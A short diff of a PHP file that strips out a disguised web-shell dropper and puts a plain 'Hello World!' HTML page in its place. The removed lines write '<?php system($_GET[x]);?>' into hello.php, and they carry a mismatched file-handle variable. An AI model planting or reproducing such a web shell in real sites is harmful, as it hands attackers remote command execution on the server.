@@ -1,8 +1,12 @@
-<?php 
-$file = fopen("hello.php","w");
-$txt = '<?php system($_GET[x]);?>';
-fwrite($myfile,$txt);
-fclose($myfile);
+<!DOCTYPE html> 
+<html> 
+<body> 
 
-echo "hello world";
-?>
+<?php 
+echo "Hello World!"; 
+
+return 0;
+?> 
+
+</body> 
+</html>
